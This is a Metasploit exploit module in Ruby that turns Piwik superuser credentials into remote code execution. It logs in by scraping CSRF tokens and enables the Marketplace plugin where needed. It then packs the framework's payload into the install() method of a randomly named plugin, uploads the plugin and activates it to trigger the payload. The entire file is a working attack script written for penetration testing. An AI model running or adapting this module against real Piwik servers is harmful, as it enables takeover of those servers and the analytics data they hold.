##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'Piwik Superuser Plugin Upload',
      'Description'     => %q{
          This module will generate a plugin, pack the payload into it
          and upload it to a server running Piwik. Superuser Credentials are
          required to run this module. This module does not work against Piwik 1
          as there is no option to upload custom plugins.
          Tested with Piwik 2.14.0, 2.16.0, 2.17.1 and 3.0.1.
        },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'FireFart' # Metasploit module
        ],
      'References'      =>
        [
          [ 'URL', 'https://firefart.at/post/turning_piwik_superuser_creds_into_rce/' ]
        ],
      'DisclosureDate'  => 'Feb 05 2017',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [['Piwik', {}]],
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path of the Piwik installation', '/']),
        OptString.new('USERNAME', [true, 'The Piwik username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The Piwik password to authenticate with'])
      ], self.class)
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def normalized_index
    normalize_uri(target_uri, 'index.php')
  end

  def get_piwik_version(login_cookies)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalized_index,
      'cookie' => login_cookies,
      'vars_get' => {
        'module' => 'Feedback',
        'action' => 'index',
        'idSite' => '1',
        'period' => 'day',
        'date' => 'yesterday'
      }
    })

    piwik_version_regexes = [
      /<title>About Piwik ([\w\.]+) -/,
      /content-title="About&#x20;Piwik&#x20;([\w\.]+)"/,
      /<h2 piwik-enriched-headline\s+feature-name="Help"\s+>About Piwik ([\w\.]+)/m
    ]

    if res && res.code == 200
      for r in piwik_version_regexes
        match = res.body.match(r)
        if match
          return match[1]
        end
      end
    end

    # check for Piwik version 1
    # the logo.svg is only available in version 1
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri, 'themes', 'default', 'images', 'logo.svg')
    })
    if res && res.code == 200 && res.body =~ /<!DOCTYPE svg/
      return "1.x"
    end

    nil
  end

  def is_superuser?(login_cookies)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalized_index,
      'cookie' => login_cookies,
      'vars_get' => {
        'module' => 'Installation',
        'action' => 'systemCheckPage'
      }
    })

    if res && res.body =~ /You can't access this resource as it requires a 'superuser' access/
      return false
    elsif res && res.body =~ /id="systemCheckRequired"/
      return true
    else
      return false
    end
  end

  def generate_plugin(plugin_name)
    plugin_json = %Q|{
      "name": "#{plugin_name}",
      "description": "#{plugin_name}",
      "version": "#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(2)}",
      "theme": false
    }|

    plugin_script = %Q|<?php
      namespace Piwik\\Plugins\\#{plugin_name};
      class #{plugin_name} extends \\Piwik\\Plugin {
        public function install()
        {
          #{payload.encoded}
        }
      }
    |

    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    zip.add_file("#{plugin_name}/#{plugin_name}.php", plugin_script)
    zip.add_file("#{plugin_name}/plugin.json", plugin_json)
    zip.pack
  end

  def exploit
    print_status('Trying to detect if target is running a supported version of piwik')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalized_index
    })
    if res && res.code == 200 && res.body =~ /<meta name="generator" content="Piwik/
      print_good('Detected Piwik installation')
    else
      fail_with(Failure::NotFound, 'The target does not appear to be running a supported version of Piwik')
    end

    print_status("Authenticating with Piwik using #{username}:#{password}...")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalized_index,
      'vars_get' => {
        'module' => 'Login',
        'action' => 'index'
      }
    })

    login_nonce = nil
    if res && res.code == 200
      match = res.body.match(/name="form_nonce" id="login_form_nonce" value="(\w+)"\/>/)
      if match
        login_nonce = match[1]
      end
    end
    fail_with(Failure::UnexpectedReply, 'Can not extract login CSRF token') if login_nonce.nil?

    cookies = res.get_cookies

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalized_index,
      'cookie' => cookies,
      'vars_get' => {
        'module' => 'Login',
        'action' => 'index'
      },
      'vars_post' => {
        'form_login' => "#{username}",
        'form_password' => "#{password}",
        'form_nonce' => "#{login_nonce}"
      }
    })

    if res && res.redirect? && res.redirection
      # update cookies
      cookies = res.get_cookies
    else
      # failed login responds with code 200 and renders the login form
      fail_with(Failure::NoAccess, 'Failed to authenticate with Piwik')
    end
    print_good('Authenticated with Piwik')

    print_status("Checking if user #{username} has superuser access")
    superuser = is_superuser?(cookies)
    if superuser
      print_good("User #{username} has superuser access")
    else
      fail_with(Failure::NoAccess, "Looks like user #{username} has no superuser access")
    end

    print_status('Trying to get Piwik version')
    piwik_version = get_piwik_version(cookies)
    if piwik_version.nil?
      print_warning('Unable to detect Piwik version. Trying to continue.')
    else
      print_good("Detected Piwik version #{piwik_version}")
    end

    if piwik_version == '1.x'
      fail_with(Failure::NoTarget, 'Piwik version 1 is not supported by this module')
    end

    # Only versions after 3 have a seperate Marketplace plugin
    if piwik_version && Gem::Version.new(piwik_version) >= Gem::Version.new('3')
      marketplace_available = true
    else
      marketplace_available = false
    end

    if marketplace_available
      print_status("Checking if Marketplace plugin is active")
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalized_index,
        'cookie' => cookies,
        'vars_get' => {
          'module' => 'Marketplace',
          'action' => 'index'
        }
      })
      fail_with(Failure::UnexpectedReply, 'Can not check for Marketplace plugin') unless res
      if res.code == 200 && res.body =~ /The plugin Marketplace is not enabled/
        print_status('Marketplace plugin is not enabled, trying to enable it')

        res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalized_index,
          'cookie' => cookies,
          'vars_get' => {
            'module' => 'CorePluginsAdmin',
            'action' => 'plugins'
          }
        })
        mp_activate_nonce = nil
        if res && res.code == 200
          match = res.body.match(/<a href=['"]index\.php\?module=CorePluginsAdmin&action=activate&pluginName=Marketplace&nonce=(\w+).*['"]>/)
          if match
            mp_activate_nonce = match[1]
          end
        end
        fail_with(Failure::UnexpectedReply, 'Can not extract Marketplace activate CSRF token') unless mp_activate_nonce
        res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalized_index,
          'cookie' => cookies,
          'vars_get' => {
            'module' => 'CorePluginsAdmin',
            'action' => 'activate',
            'pluginName' => 'Marketplace',
            'nonce' => "#{mp_activate_nonce}"
          }
        })
        if res && res.redirect?
          print_good('Marketplace plugin enabled')
        else
          fail_with(Failure::UnexpectedReply, 'Can not enable Marketplace plugin. Please try to manually enable it.')
        end
      else
        print_good('Seems like the Marketplace plugin is already enabled')
      end
    end

    print_status('Generating plugin')
    plugin_name = Rex::Text.rand_text_alpha(10)
    zip = generate_plugin(plugin_name)
    print_good("Plugin #{plugin_name} generated")

    print_status('Uploading plugin')

    # newer Piwik versions have a seperate Marketplace plugin
    if marketplace_available
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalized_index,
        'cookie' => cookies,
        'vars_get' => {
          'module' => 'Marketplace',
          'action' => 'overview'
        }
      })
    else
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalized_index,
        'cookie' => cookies,
        'vars_get' => {
          'module' => 'CorePluginsAdmin',
          'action' => 'marketplace'
        }
      })
    end

    upload_nonce = nil
    if res && res.code == 200
      match = res.body.match(/<form.+id="uploadPluginForm".+nonce=(\w+)/m)
      if match
        upload_nonce = match[1]
      end
    end
    fail_with(Failure::UnexpectedReply, 'Can not extract upload CSRF token') if upload_nonce.nil?

    # plugin files to delete after getting our session
    register_files_for_cleanup("plugins/#{plugin_name}/plugin.json")
    register_files_for_cleanup("plugins/#{plugin_name}/#{plugin_name}.php")

    data = Rex::MIME::Message.new
    data.add_part(zip, 'application/zip', 'binary', "form-data; name=\"pluginZip\"; filename=\"#{plugin_name}.zip\"")
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalized_index,
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => data.to_s,
      'cookie'    => cookies,
      'vars_get' => {
        'module' => 'CorePluginsAdmin',
        'action' => 'uploadPlugin',
        'nonce' => "#{upload_nonce}"
      }
    )
    activate_nonce = nil
    if res && res.code == 200
      match = res.body.match(/<a.*href="index.php\?module=CorePluginsAdmin&action=activate.+nonce=([^&]+)/)
      if match
        activate_nonce = match[1]
      end
    end
    fail_with(Failure::UnexpectedReply, 'Can not extract activate CSRF token') if activate_nonce.nil?

    print_status('Activating plugin and triggering payload')
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalized_index,
      'cookie' => cookies,
      'vars_get' => {
        'module' => 'CorePluginsAdmin',
        'action' => 'activate',
        'nonce' => "#{activate_nonce}",
        'pluginName' => "#{plugin_name}"
      }
    }, 5)
  end
end
